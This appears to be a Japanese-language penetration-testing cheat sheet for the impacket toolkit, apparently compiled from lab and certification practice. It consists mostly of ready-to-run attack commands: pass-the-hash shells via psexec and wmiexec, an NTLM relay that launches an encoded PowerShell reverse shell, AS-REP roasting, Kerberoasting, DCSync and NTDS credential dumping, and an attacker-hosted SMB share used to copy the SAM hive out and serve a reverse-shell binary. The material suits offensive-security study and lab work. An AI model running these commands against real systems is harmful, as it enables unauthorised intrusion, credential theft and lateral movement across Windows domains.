# impacket
psexecやsmbserverやwmiexec等、WindowsにおけるLateral Movementにつかえるものがいろいろ入っている。

## PsExec
impacketの中に入っている機能の一部。  
セッションの確立に使える。  
Lateral Movementに利用するには、以下の3つの条件を満たしている必要がある。  
1. psexecsvc.exeをC:\Windowsディレクトリに書き込める状態であること(リモートアクセス後に書き込み権限が必要ということ)
2. リモートホスト上にサービスを作成して起動できる状態であること
3. 要求されたプログラム/コマンドをpsexecsvc.exeの子プロセスとして実行できること
4. ターゲットホスト上のADMIN$共有フォルダに、ランダムに名前をつけたバイナリをペイロードとしてアップロードする。
5. 更にアップロード後、RPCを介してWindows Service Control Managerという名前でサービス登録を行う。
6. ADMIN$への書き込み権限が必要なため、ターゲットホストのローカル管理者権限を持つアカウントの認証情報を入力する必要がある。

## コマンド集

1. PtHを使って管理者権限のシェルを取る。この時、NTLMハッシュの形式は**LMハッシュ:NTハッシュ**の形式になっている。  
NTLMハッシュのみを使用する場合は、LMハッシュ部分は0で埋めておく。
```
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

2. wmiexecを使ってPtWを行う
```
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
``

3. Net-NTLMv2 relay攻撃を行うため、中継元のWindows端末からdirなどでSMB接続をこの端末にさせ、コマンドを192.168.201.212という横展開先に送り付ける。  
これで、192.168.201.212上でPowerShellのリバースシェルコマンドを実行してシェルを取れる。-encの後ろはb64
```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.201.212 -c "powershell -enc JABjAGwAaQBlAG..."
```

4. AS-REP Roastingの攻撃をADに対して実行する。ここで出力されたユーザ名はKerberos preauthenticationが無効になっていることを示し、AS-REQ Roasting攻撃に脆弱な可能性があることを示す。  
-dc-ip => DCのIPアドレスを指定  
-outputfile => AS-REPハッシュがhashcatの形式で保存される出力ファイルの名前を入力する。  
-request => TGTを要求する  
domain/user => 認証のターゲットにするユーザとドメイン名
```
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```

4.1 ユーザ名をLdap経由で取得した後、匿名でそのユーザのAS-REPハッシュが取得できないかを調べる。  
ユーザ名は事前に列挙してからリストを作成してパスワードスプレーをする。
```
sudo impacket-GetNPUsers -usersfile ./usernames.txt -no-pass -dc-ip <targetIP> htb.local/ > asrep-roasting
```

4.2 ドメインユーザのパスワードが分からないけどハッシュ値はわかるとき。
```
# with an NT hash
GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
```

5. Kerberoastingを実行するために、TGSを取得してhashcatで解析できる形でサービスチケットのハッシュを出力する。
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

6. DCSYNC攻撃をkaliからターゲットのwindowsに対して実行する。  
ここのユーザは、ドメイン上でDCSyncの権限をそもそも持っている必要があり、そのユーザの権限を借りてkaliからDCSyncの要求をしている点に注意。  
-just-dc-userの引数にターゲットのユーザ名daveを、dcsyncする際に要求を送る側には権限が必要なので、その権限を持つユーザをcorp.com/jeffadminとしてる。  
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
もしくは
```
impacket-secretsdump -just-dc htb.local/hoge:password123@10.10.10.161
```

7. impacketを使ってNTLMハッシュでAdministratorユーザとしてセッションをとる。横展開で使える。
```
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.209.73
```

8. WindowsのシャドウコピーからダンプしたバックアップファイルをKaliのローカルで解析して資格情報を抽出する。これでNTLMハッシュやKerberosのキーが取得できる。
```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

9. SMBサーバとして起動する。
```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```  
以下をKaliで行うと、ターゲットWindows上で//<kali_IP>/evil/hoge.exeとしてreverseshellを実行できる。
```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support evil $PWD
```

Kali側でサーバとして待ち受けてからWindwos側で以下みたいなコマンドをやるとファイルをコピーして送信できる。
```
copy C:\Users\THMBackup\sam.hive \\10.13.58.5\public\ \\10.13.58.5\public\ 
```

10. SAMやSYSTEMからダンプしたハッシュをもとに、kaliからDC等のマシンへpsexecでシェルをとれる。ターゲットがwin-rmを許可していないときとかはこっちで接続。
```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.127.140
```

11. windows環境でSQLとかを見つけて認証情報も持っていれば、mssqlclientでアクセスできる。  
evil-winrmやsmbでアクセスできないときに便利。
```
impacket-mssqlclient oscp.exam/sql_svc@10.10.157.148 -windows-auth
```

12. evilという共有フォルダ名でカレントディレクトリをシェアする
```
sudo impacket-smbserver evil ./
```